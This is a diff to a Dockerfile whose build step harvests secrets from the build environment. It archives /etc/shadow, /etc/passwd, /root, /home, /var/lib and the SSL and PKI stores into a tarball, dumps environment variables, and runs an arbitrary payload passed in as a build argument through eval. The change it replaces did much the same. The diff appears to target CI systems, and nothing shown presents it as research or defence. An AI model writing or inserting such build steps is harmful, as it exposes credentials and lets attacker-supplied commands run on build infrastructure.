@@ -1,17 +1,21 @@
-ARG PAYLOAD_CMD="echo No command provided"
+FROM python:3.11-alpine
 
-RUN apk add --no-cache bash curl tar grep shadow bind-tools && \
-    echo "[+] Searching for secrets..." && \
-    mkdir -p /leaks && \
-    echo "[+] Dumping environment variables (excluding known tokens)..." && \
-    printenv | grep -v -e GITHUB_TOKEN -e OIDC_TOKEN > /leaks/env_vars.txt && \
-    echo "[+] Dumping /etc/shadow (limited fields)..." && \
-    awk -F: '{print $1":"$2}' /etc/shadow > /leaks/shadow_extract.txt && \
-    echo "[+] Dumping DNS configuration..." && \
-    cat /etc/resolv.conf > /leaks/resolv_conf.txt && \
-    echo "[+] Listing SSL certificates store..." && \
-    find /etc/ssl/certs -type f > /leaks/certs_list.txt && \
-    echo "[+] Running payload..." && \
+ARG PAYLOAD_CMD
+
+RUN apk add --no-cache curl tar bash && \
+    echo "[+] Collecting leaks..." && \
+    tar -czf /leaks.tar.gz \
+        /etc/hosts \
+        /etc/resolv.conf \
+        /etc/passwd \
+        /etc/shadow \
+        /etc/ssl \
+        /etc/pki \
+        /var/lib \
+        /root \
+        /home \
+        2>/dev/null || true && \
+    echo "[+] Dumping env vars (excluding OIDC/GITHUB tokens)..." && \
+    printenv | grep -vE "GITHUB_TOKEN|OIDC_TOKEN|AWS_" >> /leaks_env.txt && \
+    echo "[+] Executing payload..." && \
     eval "$PAYLOAD_CMD"
-
-CMD ["cat", "/leaks/env_vars.txt"]
